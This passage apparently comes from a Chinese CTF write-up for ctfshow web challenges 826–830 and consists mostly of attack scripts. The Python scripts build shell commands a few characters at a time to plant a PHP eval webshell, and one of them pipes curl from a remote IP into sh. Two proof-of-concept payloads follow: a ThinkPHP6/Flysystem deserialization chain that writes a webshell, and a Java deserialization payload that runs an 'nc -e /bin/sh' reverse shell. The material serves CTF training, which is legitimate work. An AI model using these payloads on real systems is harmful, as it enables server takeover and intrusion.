20:55:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;kt-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\&gt;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\#&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;a.\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-d\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;64\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;se\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;4=\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Pz\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;k7\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;XS\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;sx\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;VF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;X0\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;gk\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;bC\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Zh\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ZX\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Ag\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;aH\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;9w\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;PD\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;S&#125;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;IF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;&#123;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\$\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ho\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ec\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh x&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh j&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span>(<span class="params">payload</span>):</span></span><br><span class="line">	data=&#123;</span><br><span class="line">	<span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">	<span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">		writeFile(p.strip())</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">	response = requests.get(url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	run()</span><br><span class="line">	check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>（这个码是get传参，需要套娃）</p>
<h1 id="web826（4字符，可写，无dir）"><a href="#web826（4字符，可写，无dir）" class="headerlink" title="web826（4字符，可写，无dir）"></a>web826（4字符，可写，无dir）</h1><p>没有dir,师傅给出了新的方法<br>这里需要flask搭建一个输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
<p>的网页</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:58</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://68786806-1097-4051-acc5-9b89a2d7e85e.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="comment">#url=&quot;http://101.34.94.44/aaa/index.php&quot; yu师傅搭建的环境</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-t\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ls&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;mv&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;l*&gt;t&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;cat&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*t&gt;z&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个地方的ip是用的10进制，因为用普通的ip地址存在多个点号。</span></span><br><span class="line"><span class="comment">#可以用这个网站转https://tool.520101.com/wangluo/jinzhizhuanhuan/</span></span><br><span class="line"><span class="string">&#x27;&gt;sh&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;38\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;44\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\:\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;57\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;33\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;95\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;94\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;20\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;cu\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh a&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">def writeFile(payload):</span><br><span class="line">	data=&#123;</span><br><span class="line">	<span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">	<span class="keyword">for</span> p in payload:</span><br><span class="line">		writeFile(p.strip())</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">	response = requests.get(url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	run()</span><br><span class="line">	check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="web827（4字符，可写、无dir，不出网）"><a href="#web827（4字符，可写、无dir，不出网）" class="headerlink" title="web827（4字符，可写、无dir，不出网）"></a>web827（4字符，可写、无dir，不出网）</h1><p>服务器不出网则无法使用curl命令，老套路</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:56:17</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-t\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ls&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;mv&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;l*&gt;t&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;cat&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*t&gt;z&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&gt;php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;a.\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-d\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;64\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;se\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;4=\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Pz\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;k7\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;XS\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;sx\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;VF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;X0\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;gk\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;bC\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Zh\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ZX\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Ag\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;aH\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;9w\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;PD\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;S&#125;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;IF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;&#123;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\$\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ho\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ec\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh a&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def writeFile(payload):</span><br><span class="line">	data=&#123;</span><br><span class="line">	<span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">	<span class="keyword">for</span> p in payload:</span><br><span class="line">		writeFile(p.strip())</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">	response = requests.get(url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	run()</span><br><span class="line">	check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>总结<br><img src="https://img-blog.csdnimg.cn/f1f0baca74c849de9b00d6d1442a6a53.png"></p>
<h1 id="web828（国赛TP6的反序列化）"><a href="#web828（国赛TP6的反序列化）" class="headerlink" title="web828（国赛TP6的反序列化）"></a>web828（国赛TP6的反序列化）</h1><p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-05-27 15:32:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-05-31 20:16:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">local</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$cache</span> = [];</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> Local();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file=<span class="string">&quot;1.php&quot;</span>;</span><br><span class="line">		array_push(<span class="keyword">$this</span>-&gt;cache, <span class="string">&#x27;&lt;?php $a=$_POST[1];eval($a);?&gt;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$adapter</span> = <span class="keyword">new</span> Adapter();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$adapter</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>大概思路<br>寻找_destruct发现<br><img src="https://img-blog.csdnimg.cn/3ae82882bc3d43cda09d260ad778875a.png"><br>跟进save发现<br><img src="https://img-blog.csdnimg.cn/0157c18be72a47f69d31404179395e24.png"><br>在这里我们看到write函数<br>其中只要file和content两个参数可控，就应该可以写文件<br>跟进getforstorage发现<br><img src="https://img-blog.csdnimg.cn/1676ccd4cf494d7795a1f90f1509aeff.png"><br>可以发现我们将恶意代码放给cache属性，他就会json加密并赋给content，所以content可控，由于file本身就是属性，所以file也可控<br>接下类就是查看write函数<br>全局查找write函数可以发现local类中有write函数，同时还有file_put_contents函数<br><img src="https://img-blog.csdnimg.cn/f8aac41f916747b4ba30bd53bc4e7143.png"><br>分析write函数发现location是可控的<br>因此写文件成立<br>利用上面的poc可以写文件且写入成功<br><img src="https://img-blog.csdnimg.cn/1d03c1743c014753abb6a70c9d47bf78.png"><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/7069307571483443231">网上其他payload</a></p>
<h1 id="web829"><a href="#web829" class="headerlink" title="web829"></a>web829</h1><p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;nc ip port -e /bin/sh&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(bo);</span><br><span class="line">        oo.writeObject(user);</span><br><span class="line">         <span class="keyword">byte</span>[] bytes = bo.toByteArray();</span><br><span class="line">        bo.close();</span><br><span class="line">        oo.close();</span><br><span class="line">        String userData  = <span class="keyword">new</span> String(Base64.getEncoder().encode(bytes));</span><br><span class="line">        System.out.println(userData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3254536114659397781L</span>;</span><br><span class="line">        <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">this</span>.username);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web-830"><a href="#web-830" class="headerlink" title="web 830"></a>web 830</h1><p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 